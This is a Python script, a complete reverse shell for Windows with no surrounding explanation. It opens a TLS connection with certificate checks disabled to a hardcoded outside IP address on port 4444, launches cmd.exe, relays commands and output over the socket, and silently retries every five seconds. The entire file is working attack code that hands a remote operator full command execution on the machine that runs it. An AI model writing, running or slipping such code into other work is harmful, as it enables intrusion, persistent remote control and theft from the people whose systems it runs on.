import socket
import ssl
import subprocess
import threading
import time

LHOST = "172.105.149.46"
LPORT = 4444

def handle_io(proc, conn):
    def read_from_proc():
        while True:
            output = proc.stdout.readline()
            if output:
                try:
                    conn.sendall(output)
                except:
                    break
            else:
                break

    def write_to_proc():
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    break
                proc.stdin.write(data.decode(errors='ignore') + '\n')
                proc.stdin.flush()
            except:
                break

    threading.Thread(target=read_from_proc, daemon=True).start()
    write_to_proc()

def connect():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            with socket.create_connection((LHOST, LPORT)) as sock:
                with context.wrap_socket(sock, server_hostname=LHOST) as ssock:
                    ssock.send(b"[+] Connected from Windows\n")
                    proc = subprocess.Popen(
                        ["cmd.exe"],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True
                    )
                    handle_io(proc, ssock)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    connect()

